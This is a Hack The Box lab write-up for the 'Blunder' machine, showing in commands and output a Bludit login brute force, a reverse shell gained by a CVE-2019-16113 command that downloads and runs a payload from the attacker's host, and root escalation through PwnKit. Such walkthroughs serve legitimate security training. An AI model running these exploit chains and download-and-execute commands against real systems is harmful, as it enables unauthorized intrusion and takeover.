# Target
| Category          | Details                                                               |
|-------------------|-----------------------------------------------------------------------|
| 📝 **Name**       | [Blunder](https://app.hackthebox.com/machines/Blunder)                |  
| 🏷 **Type**       | HTB Machine                                                           |
| 🖥 **OS**         | Linux                                                                 |
| 🎯 **Difficulty** | Easy                                                                  |
| 📁 **Tags**       | Bludit CMS, CVE-2019-17240, CVE-2019-16113, Metasploit, CVE-2021-4034 |

# Scan
```
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Blunder | A blunder of interesting facts
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder
```

# Attack path
1. [Exploit CVE-2019-17240 to conduct a dictionary attack against user `fergus`](#exploit-cve-2019-17240-to-conduct-a-dictionary-attack-against-user-fergus)
2. [Gain initial foothold by exploiting CVE-2019-16113 using credentials for user `fergus`](#gain-initial-foothold-by-exploiting-cve-2019-16113-using-credentials-for-user-fergus)
3. [Escalate to `root` user by exploiting CVE-2021-4034](#escalate-to-root-user-by-exploiting-cve-2021-4034)

### Exploit [CVE-2019-17240](https://nvd.nist.gov/vuln/detail/CVE-2019-17240) to conduct a dictionary attack against user `fergus`

#### Identify target is running `Bludit` CMS
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ curl -I $TARGET              
HTTP/1.0 200 OK
Date: Tue, 11 Nov 2025 09:37:14 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: Bludit
Connection: close
Content-Type: text/html; charset=UTF-8
```

#### Identify version of `Bludit` CMS to be 3.9.2
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ curl -s $TARGET/admin/ | grep version
        <link rel="shortcut icon" type="image/x-icon" href="/bl-kernel/img/favicon.png?version=3.9.2">
        <link rel="stylesheet" type="text/css" href="http://10.129.60.119/bl-kernel/css/bootstrap.min.css?version=3.9.2">
<link rel="stylesheet" type="text/css" href="http://10.129.60.119/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2">
<link rel="stylesheet" type="text/css" href="http://10.129.60.119/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css?version=3.9.2">
        <script src="http://10.129.60.119/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
<script src="http://10.129.60.119/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2"></script>
```
This version is vulnerable to [CVE-2019-17240](https://nvd.nist.gov/vuln/detail/CVE-2019-17240)

#### Discover publicly available `todo.txt` with `feroxbuster` enumeration
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ feroxbuster --url http://10.129.60.119/ -w /usr/share/wordlists/dirb/big.txt -d 1 -x txt    
<SNIP>
200      GET        4l       23w      118c http://10.129.60.119/todo.txt
<SNIP>
```

#### Discover `fergus` username in `todo.txt`
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ curl $TARGET/todo.txt                
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

#### Store `fergus` username in `users.txt`
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ echo fergus > users.txt 
```

#### Prepare password dictionary using main page content
As dictionary attack with `rockyou.txt` does not yield imidate results, and 'about panel' states:
> I created this site to dump my fact files, nothing more.......?

We will generate our own dictionary using 'interesting facts' from the main page.
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ curl -s $TARGET | tr -c '[:alnum:]' '[\n*]' | sort -u > passwords.txt
```

#### Exploit [CVE-2019-17240](https://nvd.nist.gov/vuln/detail/CVE-2019-17240) to perform dictionary attack
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ wget https://www.exploit-db.com/raw/48942 -O CVE-2019-17240.py && \
python3 -m venv .venv && source .venv/bin/activate && \
pip3 install pwn && \
python3 ./CVE-2019-17240.py -l http://$TARGET/admin/login.php -u users.txt -p passwords.txt
<SNIP>
[ ] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain
<SNIP>
```

### Gain initial foothold by exploiting [CVE-2019-16113](https://nvd.nist.gov/vuln/detail/CVE-2019-16113) using credentials for user `fergus`

#### Generate and host `linux/x64/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f elf \
    -o shell && \
python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x64/meterpreter/reverse_tcp; run"  
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.54:4444
```

#### Exploit [CVE-2019-16113](https://nvd.nist.gov/vuln/detail/CVE-2019-16113) to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Blunder]
└─$ wget https://www.exploit-db.com/raw/48568 -O CVE-2019-16113.py && \
python3 ./CVE-2019-16113.py -u http://$TARGET/ -user fergus -pass RolandDeschain -c "/bin/bash -c 'wget -P /tmp $LHOST/shell;chmod +x /tmp/shell;/tmp/shell'"
<SNIP>
[+] csrf_token: a2fdb89d92e60df5e15b52ede466c1e71b5d1320
[+] cookie: lq7qn7absjg5euajksiqos81t0
[+] csrf_token: d30070b94672513952f76317cacfa2312073cb67
[+] Uploading qfnghucz.jpg
[+] Executing command: /bin/bash -c 'wget -P /tmp 10.10.16.54/shell;chmod +x /tmp/shell;/tmp/shell'
[+] Delete: .htaccess
[+] Delete: qfnghucz.jpg
```

#### Confirm foothold gained
```
[*] Started reverse TCP handler on 10.10.16.54:4444 
[*] Sending stage (3090404 bytes) to 10.129.60.119
[*] Meterpreter session 1 opened (10.10.16.54:4444 -> 10.129.60.119:55538) at 2025-11-11 19:02:52 +0100

meterpreter > getuid
Server username: www-data
```

### Escalate to `root` user by exploiting [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)

#### Run `exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec`
Exploit suggested by `post/multi/recon/local_exploit_suggester`
```
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
SESSION => 1
msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST tun0
LHOST => tun0
msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 5555
LPORT => 5555
msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run
[*] Started reverse TCP handler on 10.10.16.54:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.iisdhbktvni
[+] The target is vulnerable.
[*] Writing '/tmp/.edgakzu/ttmybhxjvh/ttmybhxjvh.so' (540 bytes) ...
[!] Verify cleanup of /tmp/.edgakzu
[*] Sending stage (3090404 bytes) to 10.129.60.119
[+] Deleted /tmp/.edgakzu/ttmybhxjvh/ttmybhxjvh.so
[+] Deleted /tmp/.edgakzu/.paxvcdhj
[+] Deleted /tmp/.edgakzu
[*] Meterpreter session 2 opened (10.10.16.54:5555 -> 10.129.60.119:34750) at 2025-11-11 19:04:29 +0100

meterpreter > getuid
Server username: root
```
